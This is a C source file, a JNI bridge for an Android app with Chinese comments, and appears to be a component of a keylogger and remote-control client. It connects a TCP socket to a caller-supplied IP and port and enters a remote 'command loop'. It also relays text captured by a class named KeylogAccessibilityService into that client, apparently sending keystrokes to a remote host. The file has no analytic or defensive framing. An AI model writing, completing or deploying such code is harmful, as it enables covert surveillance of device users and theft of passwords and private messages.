/*
 * client_jni.c — JNI 桥接层
 */
#include <jni.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <android/log.h>
#include "include/common.h"

#define TAG "ClientJNI"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,  TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__)

/* 声明 socket_client.c 中的函数 */
extern void client_run_loop(int sock);
extern void client_on_key_event(const char *key_text);
extern volatile int g_running;
extern int g_sock;

/* 连接并运行主循环 */
JNIEXPORT jint JNICALL
Java_com_client_ClientService_nativeConnect(JNIEnv *env, jobject thiz,
                                             jstring j_ip, jint port) {
    const char *ip = (*env)->GetStringUTFChars(env, j_ip, NULL);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        LOGE("socket 创建失败");
        (*env)->ReleaseStringUTFChars(env, j_ip, ip);
        return -1;
    }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    (*env)->ReleaseStringUTFChars(env, j_ip, ip);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        LOGE("连接失败");
        close(sock);
        return -1;
    }

    LOGI("已连接，进入命令循环");
    client_run_loop(sock); // 阻塞直到断开
    return 0;
}

/* 断开连接 */
JNIEXPORT void JNICALL
Java_com_client_ClientService_nativeDisconnect(JNIEnv *env, jobject thiz) {
    g_running = 0;
    if (g_sock >= 0) {
        shutdown(g_sock, SHUT_RDWR);
        close(g_sock);
        g_sock = -1;
    }
}

/* 键盘事件（由 AccessibilityService 调用） */
JNIEXPORT void JNICALL
Java_com_client_KeylogAccessibilityService_nativeOnKeyEvent(JNIEnv *env, jobject thiz,
                                                             jstring j_text) {
    const char *text = (*env)->GetStringUTFChars(env, j_text, NULL);
    client_on_key_event(text);
    (*env)->ReleaseStringUTFChars(env, j_text, text);
}
